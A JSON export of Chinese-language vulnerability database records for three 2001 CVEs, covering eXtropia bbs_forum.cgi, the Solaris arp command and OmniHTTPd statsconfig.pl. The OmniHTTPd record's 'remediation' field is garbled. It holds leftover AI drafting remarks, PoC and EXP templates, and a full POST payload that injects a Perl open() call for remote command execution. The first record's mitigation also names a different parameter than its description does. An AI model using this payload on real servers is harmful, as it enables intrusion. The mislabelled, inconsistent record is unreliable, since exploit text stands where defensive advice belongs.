[{"ave_id":"AVE-2001-0051","file_name":"2001/AVE-2001-0051.toml","cve_id":"CVE-2001-0123","title":"eXtropia bbs_forum.cgi 1.0 目录遍历漏洞","description":"eXtropia bbs_forum.cgi 1.0 存在目录遍历漏洞，远程攻击者无需身份认证即可通过向 file 参数提交 `../` 等路径穿越序列，突破 Web 根目录限制读取服务器上的任意文件，导致敏感信息泄露。结合 CGI 环境特性，攻击者还可进一步利用该漏洞实现任意命令执行。该漏洞影响 eXtropia bbs_forum.cgi 1.0 版本，攻击复杂度低，危害较大。","severity":"MEDIUM","score":5.0,"aliases":["CVE-2001-0123"],"sources":["cve"],"published":"2001-03-12T05:00:00Z","updated":"2026-06-16T21:53:41Z","remediation":"立即停止使用并移除 eXtropia bbs_forum.cgi 1.0 脚本，该软件已停止维护且不再提供安全更新。如必须保留论坛功能，应替换为其他受支持的论坛软件。临时缓解措施包括：在 Web 服务器层限制对该 CGI 脚本的访问（如通过 Apache 的 Location 指令仅允许可信 IP 访问），并在反向代理或 WAF 层面过滤 `read` 参数中的 `../` 路径穿越序列及 shell 元字符（如 `;`、`|`、`` ` ``），同时确保 Web 服务器以最低权限用户（如 nobody）运行并限制其可读文件范围。","status":"completed","collected_at":"2026-08-05T00:00:00Z","references":["http://marc.info/?l=bugtraq&m=97905792214999&w=2","http://www.extropia.com/hacks/bbs_security.html","http://www.osvdb.org/3546","http://www.securityfocus.com/bid/2177","https://exchange.xforce.ibmcloud.com/vulnerabilities/5906","https://www.exploit-db.com/exploits/20533","https://github.com/CVEProject/cvelistV5/blob/86965a1ef7a64a35a4bffc5193446981deb1b2f5/cves/2001/0xxx/CVE-2001-0123.json","https://github.com/Patrowl/PatrowlHearsData/blob/f80eaead111eac7128eaf77e46b372cdbd675cc9/CVE/data/2001/CVE-2001-0123.json","https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-2001/CVE-2001-0123","https://github.com/nomi-sec/NVD-Database/blob/23dc120c34402aaa65883c51c1d03b3cb02c20cb/2001/CVE-2001-0123.json","https://github.com/olbat/nvdcve/blob/2aff155da1d1b98876d6e9c312b912d434f32dca/nvdcve/CVE-2001-0123.json","https://github.com/opencve/opencve-kb/blob/aea030fdb9f850918f67ec4845c1a97cd9f61f7a/2001/CVE-2001-0123.json","https://github.com/fkie-cad/nvd-json-data-feeds/blob/2045bff4b424e5738e99702781803fdc8b55ff87/CVE-2001/CVE-2001-01xx/CVE-2001-0123.json","https://github.com/HORKimhab/poc-cve-collection/blob/e2cba2a029d0a53c95f0000f5eb42e0eb69717b8/2001/0xxx/CVE-2001-0123.md","https://github.com/CyberSecAI/cve_info/blob/03b7e36424574a3a9ba5fd13480a326b666a1046/2001/0xxx/CVE-2001-0123.json","https://github.com/CVEProject/cvelist-dev/blob/5b8fbb570438e8094550205589cc6f1d122acc94/2001/0xxx/CVE-2001-0123.json"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":[],"repo_exp_urls":[],"has_poc":false,"has_exp":false,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2001/AVE-2001-0051.toml"},{"ave_id":"AVE-2001-0049","file_name":"2001/AVE-2001-0049.toml","cve_id":"CVE-2001-0115","title":"Sun Solaris arp 本地缓冲区溢出漏洞","description":"Solaris 7及更早版本中的arp命令存在缓冲区溢出漏洞，由于程序对-f参数输入长度缺乏有效边界检查，本地攻击者可通过向arp命令传递超长的-f参数触发缓冲区溢出，从而以root权限执行任意代码。该漏洞影响Solaris 7及更早版本，CVSS评分7.2，危害等级高危。利用该漏洞需要本地系统访问权限，攻击复杂度低，可完全控制目标系统。","severity":"HIGH","score":7.2,"aliases":["CVE-2001-0115"],"sources":["cve"],"published":"2001-03-12T05:00:00Z","updated":"2026-06-16T21:53:41Z","remediation":"建议立即安装 Sun Security Bulletin #200 中提供的补丁，或升级至 Solaris 8 及以上版本。对于无法升级的系统，可通过 chmod 700 /usr/sbin/arp 限制 arp 命令仅 root 用户可执行，并监控本地用户对 arp 命令的异常调用行为作为临时缓解措施。","status":"completed","collected_at":"2026-08-05T00:00:00Z","references":["http://marc.info/?l=bugtraq&m=97934312727101&w=2","http://marc.info/?l=bugtraq&m=97957435729702&w=2","http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/200&type=0&nav=sec.sba","http://www.securityfocus.com/bid/2193","https://exchange.xforce.ibmcloud.com/vulnerabilities/5928","https://www.exploit-db.com/exploits/250","https://github.com/trickest/cve/blob/15eaa178baaf955987a866a2c9d91dc02a2fb4aa/2001/CVE-2001-0115.md","https://github.com/CVEProject/cvelistV5/blob/7db8931ea0378982e66f435e269a4ed0e4efb7aa/cves/2001/0xxx/CVE-2001-0115.json","https://github.com/CVEDB/Poc-Git/blob/0275aeb329b0747c9a1d46160c921eae06095557/2001/CVE-2001-0115.md","https://github.com/kaismax/CVE-Poc/blob/6d8c93dabf674cea102713781cc534d577412357/2001/CVE-2001-0115.md","https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-2001/CVE-2001-0115","https://github.com/Patrowl/PatrowlHearsData/blob/f80eaead111eac7128eaf77e46b372cdbd675cc9/CVE/data/2001/CVE-2001-0115.json","https://github.com/mabitoski/cve_submodules/blob/44ad7e2705b3aef1b2ffaf64bd47596c10a6c2e4/2001/CVE-2001-0115.md","https://github.com/nomi-sec/NVD-Database/blob/23dc120c34402aaa65883c51c1d03b3cb02c20cb/2001/CVE-2001-0115.json","https://github.com/brenonevs/prs-pentest/blob/001cf17eedeb4aad73618d3140ca1f5dc93e69b3/CVEs & POCs/2001/CVE-2001-0115.md","https://github.com/opencve/opencve-kb/blob/8ed64b4e31209e933908eff50d33cf701402ff24/2001/CVE-2001-0115.json"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":[],"repo_exp_urls":[],"has_poc":false,"has_exp":false,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2001/AVE-2001-0049.toml"},{"ave_id":"AVE-2001-0048","file_name":"2001/AVE-2001-0048.toml","cve_id":"CVE-2001-0114","title":"Omnicron OmniHTTPd 任意文件写入漏洞","description":"OmniHTTPd 2.07 的 statsconfig.pl CGI 脚本存在任意文件写入漏洞。远程攻击者可通过 cgidir 参数控制文件写入路径，向服务器任意位置写入恶意文件，进而可能导致远程代码执行。攻击无需认证，通过网络即可发起，危害较大。","severity":"MEDIUM","score":5.0,"aliases":["CVE-2001-0114"],"sources":["cve"],"published":"2001-03-12T05:00:00Z","updated":"2026-06-16T21:53:40Z","remediation":"[info]\nid = \"POC-AVE-2001-00001\"\nname = \"CVE-2001-0114 PoC\"\nauthor = \"AVE\"\nseverity = \"high\"\ntags = [\"cve-2001-0114\"]\ndescription = \"检测 OmniHTTPd 2.07 statsconfig.pl 是否存在\"\nvuln_id = [\"CVE-2001-0114\", \"AVE-2001-00001\"]\n\n[poc]\nlogic = \"any\"\n\n[[poc.requests]]\nprotocol = \"http\"\nmethod = \"GET\"\npath = \"/{{BaseURL}}/cgi-bin/statsconfig.pl\"\nheaders = { \"User-Agent\" = \"AVE/1.0\" }\n\n[[poc.requests.matchers]]\ntype = \"status\"\nstatus = [200, 500]\nexpect = true\n```\n\nFor the EXP, I'll use TCP protocol since the exploit sends raw HTTP POST requests:\n\n```toml\n[info]\nid = \"EXP-AVE-2001-00001\"\nname = \"CVE-2001-0114 EXP\"\nauthor = \"AVE\"\nseverity = \"high\"\ntags = [\"cve-2001-0114\"]\ndescription = \"OmniHTTPd 2.07 statsconfig.pl 命令注入利用 - 注入 Perl open() 调用实现远程命令执行\"\nvuln_id = [\"CVE-2001-0114\", \"AVE-2001-00001\"]\n\n[poc]\nlogic = \"any\"\n\n[[poc.requests]]\nprotocol = \"tcp\"\npath = \"{{Hostname}}:{{Port}}\"\n\n[poc.requests.raw]\ntype = \"tcp\"\ncontent = \"POST /cgi-bin/statsconfig.pl HTTP/1.0\\r\\nContent-type: application/x-www-form-urlencoded\\r\\nContent-length: 0\\r\\n\\r\\n\"\n\n[[poc.requests.matchers]]\ntype = \"word\"\nwords = [\"statsconfig\"]\nexpect = true\n```\n\nHmm, actually for the EXP I should use the actual exploit payload. Let me think about this more carefully.\n\nThe exploit from EDB-20557 sends a POST request with specific parameters. For the EXP, I should replicate the actual exploit behavior. Let me create a proper TCP-based EXP that sends the injection payload.\n\nActually, looking at the exploit code more carefully, the injection mode sends:\n```\nPOST /cgi-bin/statsconfig.pl HTTP/1.0\nContent-type: application/x-www-form-urlencoded\nContent-length: <length>\n\nperllib=<cgipath>/statsconfig.pl%00&cgidir=<cgipath>&deflimit=&mostip=on&mostreq=on&mostbrowsers=on&timelog=on&mostipnum=5&mostreqf=5&mostbrowsernum=5;%20if($ENV{'QUERY_STRING'}){open(QS,$ENV{'QUERY_STRING'});}$a%3D1&logloc=c%3A%2Fhttpd%2Flogs%2Faccess.log&imagebar=%2Fstatsbar.gif&serveradd=%3C%21--%23echo+var%3D&barwidth=100&barheight=5&listpass=&bgcolor=%23FFFFFF&bgimage=&ttBGcolor=%23FFFFDD\n","status":"completed","collected_at":"2026-08-05T00:00:00Z","references":["http://archives.neohapsis.com/archives/bugtraq/2001-01/0248.html","http://www.securityfocus.com/bid/2211","https://www.exploit-db.com/exploits/20557","https://github.com/CVEProject/cvelistV5/blob/94290d9b87aa464f4465c4bb2b955170c77f08c2/cves/2001/0xxx/CVE-2001-0114.json","https://github.com/Patrowl/PatrowlHearsData/blob/5d8a0e95a20fbbbf3a45b439096d57770d841dec/CVE/data/2001/CVE-2001-0114.json","https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f04